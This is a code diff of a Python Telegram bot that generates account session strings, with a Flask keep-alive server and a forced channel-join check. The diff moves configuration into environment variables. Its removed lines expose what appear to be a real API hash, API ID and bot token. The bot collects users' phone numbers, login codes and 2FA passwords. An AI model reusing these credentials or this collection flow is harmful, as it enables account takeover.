@@ -1,6 +1,9 @@
-#---------------------------------------------------------
+import os
+from dotenv import load_dotenv
+load_dotenv()
+
+# ---------------------------------------------------------
 # 🚑 CRITICAL FIX FOR PYTHON 3.10+ / 3.14
-# Yeh hissa sabse upar hona chahiye, imports se bhi pehle
 # ---------------------------------------------------------
 import asyncio
 try:
@@ -12,29 +15,34 @@ except RuntimeError:
 # ---------------------------------------------------------
 # IMPORTS
 # ---------------------------------------------------------
-from pyrogram import Client, filters, idle
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-from pyrogram.errors import UserNotParticipant, SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from pyrogram.errors import UserNotParticipant, SessionPasswordNeeded
 from pyrogram.enums import ChatMemberStatus
 import time
-import os
 from flask import Flask
 from threading import Thread
 
 # ---------------------------------------------------------
-# ⚠️ CONFIGURATION (Apna Data Yahan Rakhein)
+# ⚙️ CONFIGURATION
 # ---------------------------------------------------------
-API_ID = 37314366
-API_HASH = "bd4c934697e7e91942ac911a5a287b46"
-BOT_TOKEN = "8319710991:AAGjPDlurUUIhEkenfkymicf8WL5H6L4f4k"
+API_ID = int(os.getenv("API_ID"))
+API_HASH = os.getenv("API_HASH")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+SESSION_NAME = os.getenv("SESSION_NAME")
 
-# Force Subscribe Channels
 FORCE_CHANNELS = [
-    {"title": "First Channel", "id": -1003387459132, "url": "https://t.me/+wZ9rDQC5fkYxOWJh"},
-    {"title": "Second Channel", "id": -1003892920891, "url": "https://t.me/+Om1HMs2QTHk1N2Zh"}
+    {
+        "title": os.getenv("CHANNEL_1_TITLE"), 
+        "id": int(os.getenv("CHANNEL_1_ID")), 
+        "url": os.getenv("CHANNEL_1_URL")
+    },
+    {
+        "title": os.getenv("CHANNEL_2_TITLE"), 
+        "id": int(os.getenv("CHANNEL_2_ID")), 
+        "url": os.getenv("CHANNEL_2_URL")
+    }
 ]
-
-SESSION_NAME = "magma_force_v8"
 
 # Global variables
 user_sessions = {}
@@ -49,7 +57,7 @@ def home():
     return "Bot is Running 24/7 with Force Sub 🚀"
 
 def run_web():
-    port = int(os.environ.get("PORT", 8080))
+    port = int(os.getenv("PORT", 8080))
     flask_app.run(host="0.0.0.0", port=port)
 
 def keep_alive():
@@ -85,7 +93,7 @@ async def get_force_sub_buttons(client, user_id):
         except UserNotParticipant:
             buttons.append([InlineKeyboardButton(f"🔔 Join {channel['title']}", url=channel['url'])])
             not_joined = True
-        except Exception as e:
+        except Exception:
             pass
 
     if not_joined:
@@ -161,8 +169,7 @@ async def get_session_command(client, message):
     await message.reply(
         "📱 **Step 1/2: Phone Number**\n\n"
         "📞 Send your phone number:\n"
-        "**Example:** `+919876543210`\n"
-        "**Example:** `+1234567890`\n\n"
+        "**Example:** `+919876543210`\n\n"
         "❌ Type /cancel to stop."
     )
 
@@ -177,10 +184,6 @@ async def cancel_session(client, message):
         await message.reply("✅ Process cancelled.")
     else:
         await message.reply("⚠️ No active session to cancel.")
-
-# ---------------------------------------------------------
-# 📨 MESSAGE HANDLER
-# ---------------------------------------------------------
 
 @app.on_message(filters.text & filters.private)
 async def handle_text(client, message):
@@ -234,8 +237,6 @@ async def handle_text(client, message):
                 user_sessions[user_id]["step"] = "2fa"
                 await message.reply("🔐 **2FA Detected!**\nEnter Password.")
                 return
-            except Exception as e:
-                raise e
             await send_session_data(client, message, tc, ph)
         except Exception as e:
             await message.reply(f"❌ OTP Error: {e}")
@@ -265,11 +266,7 @@ async def send_session_data(bot, message, temp_client, phone):
         await temp_client.disconnect()
         if user_id in user_sessions: del user_sessions[user_id]
 
-# ---------------------------------------------------------
-# 🚀 MAIN EXECUTION
-# ---------------------------------------------------------
-
 if __name__ == "__main__":
     print("🚀 Session Bot Starting...")
-    keep_alive() # Flask Server
+    keep_alive()
     app.run()
